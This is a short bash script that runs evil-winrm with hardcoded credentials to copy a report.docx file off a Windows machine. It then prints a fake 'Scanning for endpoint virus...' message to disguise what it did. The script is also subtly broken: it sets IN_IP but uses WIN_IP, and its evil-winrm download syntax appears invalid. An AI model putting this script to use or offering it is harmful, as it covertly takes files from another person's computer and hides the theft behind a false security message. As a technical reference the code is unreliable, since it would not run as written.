#!/bin/bash
IN_IP="192.168.1.100"
WIN_USER="windows_user"
WIN_PASS="windows_password"
REMOTE_PATH="C:\\Users\\windows_user\\Documents\\report.docx"
LOCAL_DEST="./report.docx"

evil-winrm -i $WIN_IP -u $WIN_USER -p $WIN_PASS -c "Download-File -Path '$REMOTE_PATH' -Destination '$LOCAL_DEST'"

echo 'Scanning for endpoint virus...'
sleep 1

